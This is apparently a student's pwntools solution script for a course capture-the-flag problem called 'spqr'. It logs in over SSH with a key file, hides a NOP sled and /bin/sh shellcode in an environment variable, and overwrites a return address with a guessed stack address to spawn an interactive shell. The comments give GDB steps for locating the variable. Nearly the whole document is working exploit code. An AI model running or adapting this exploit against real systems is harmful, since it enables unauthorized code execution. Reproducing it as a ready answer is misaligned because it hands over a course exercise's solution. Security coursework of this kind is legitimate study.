#Server Solution 
from pwn import * 
context.clear(arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

s = ssh('jjcabral', 'cs4401shell.walls.ninja', keyfile='jjcabral_ssh_key')
s.set_working_directory('/problems/spqr_0_1a75dff050e0e195fa54ae756a56ceef')

#Go to ur spqr directory and gdb spqr
#Set environment variable WIN with a HUGE NOP sled (this will be just to test)
#open SPQR in GDB and step into a random place in the function
#find ur environment variable using the following command
#x/s ((char **)environ +number) <----- replace number with 21,22, 23, mine was around the 20x mark,
#you'll need this address to approximate where the environment we will add will be
#unset ur WIN variable with unset env WIN
#CLose out of remote shell

offset = 8 #?
guess = 8215 #increment this guess if when u run it gives EOF. This is where 1/16 chance comes from
code = asm(shellcraft.nop())*guess+asm(shellcraft.sh())
code_addr = p64(0x7fffffffe79b + 1000) # Put GDB addr here,Middle of NOP slide hopefully, I added 1000 to give some wiggle room
payload = flat({offset:code_addr})
p = s.process('./spqr', env={'WIN':code})

p.sendline(payload) 
p.interactive()